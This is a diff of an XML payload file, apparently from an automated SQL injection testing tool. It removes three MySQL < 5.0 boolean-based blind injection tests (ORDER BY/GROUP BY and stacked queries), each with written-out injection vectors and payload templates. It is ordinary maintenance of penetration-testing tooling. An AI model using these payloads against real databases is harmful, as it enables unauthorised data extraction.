@@ -1110,46 +1110,6 @@ Tag: <test>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&lt; 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
-        <stype>1</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>2,3</clause>
-        <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&lt; 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
         <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause</title>
         <stype>1</stype>
         <level>2</level>
@@ -1442,27 +1402,6 @@ Tag: <test>
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - Stacked queries</title>
-        <stype>1</stype>
-        <level>5</level>
-        <risk>1</risk>
-        <clause>1-8</clause>
-        <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
-        <request>
-            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&lt; 5.0</dbms_version>
         </details>
     </test>
 
